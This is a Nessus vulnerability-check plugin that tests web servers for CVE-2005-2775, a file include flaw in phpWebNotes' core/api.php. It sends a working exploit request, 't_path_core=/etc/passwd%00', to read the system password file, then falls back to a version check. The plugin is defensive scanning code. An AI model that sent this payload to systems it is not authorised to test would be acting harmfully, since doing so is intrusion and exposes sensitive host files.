#
# (C) Tenable Network Security
#


  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that allows for arbitrary
code execution. 

Description :

The remote host is running phpWebNotes, an open-source page annotation
system modelled after php.net. 

The version of phpWebNotes installed on the remote host allows
attackers to control the 't_path_core' parameter used when including
PHP code in the 'core/api.php' script.  By leveraging this flaw, an
attacker is able to view arbitrary files on the remote host and
execute arbitrary PHP code, possibly taken from third-party hosts. 

See also : 

http://www.securityfocus.com/archive/1/409411/30/0/threaded

Solution : 

Unknown at this time.

Risk factor : 

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(19521);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2775");
  script_bugtraq_id(14679);

  name["english"] = "phpWebNotes t_path_core Parameter File Include Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for t_path_core parameter file include vulnerability in phpWebNotes";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw to read /etc/passwd.
  #
  # nb: the actual value of t_path_core will be unaffected unless
  #     register_globals is disabled, according to 'core/php_api.php'.
  req = http_get(
    item:string(
      dir, "/core/api.php?",
      "t_path_core=/etc/passwd%00"
    ),
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(string:res, pattern:"root:.*:0:[01]:") ||
    # we get an error saying "failed to open stream" or "Failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but remote URLs
    #     might still work.
    egrep(string:res, pattern:"Warning.+main\(/etc/passwd.+failed to open stream") ||
    "Failed opening required '/etc/passwd" >< res
  ) {
    security_hole(port);
    exit(0);
  }
  # Otherwise if the script exists, check the version number as
  # PHP's display_errors may simply be disabled.
  else if (egrep(string:res, pattern:"^HTTP/.* 200 OK")) {
    req = http_get(item:string(dir, "/login_page.php"), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # versions 2.0.0-pr1 and probably earlier are affected.
    if (egrep(string:res, pattern:'class="version">phpWebNotes - ([01]\\..+|2\\.0\\.0-pr1)</span>')) {
      desc = str_replace(
        string:desc["english"],
        find:"See also :",
        replace:string(
          "***** Nessus has determined the vulnerability exists on the remote\n",
          "***** host simply by looking at the version number of phpWebNotes\n",
          "***** installed there.\n",
          "\n",
          "See also :"
        )
      );
      security_hole(port:port, data:desc);
      exit(0);
    }
  }
}

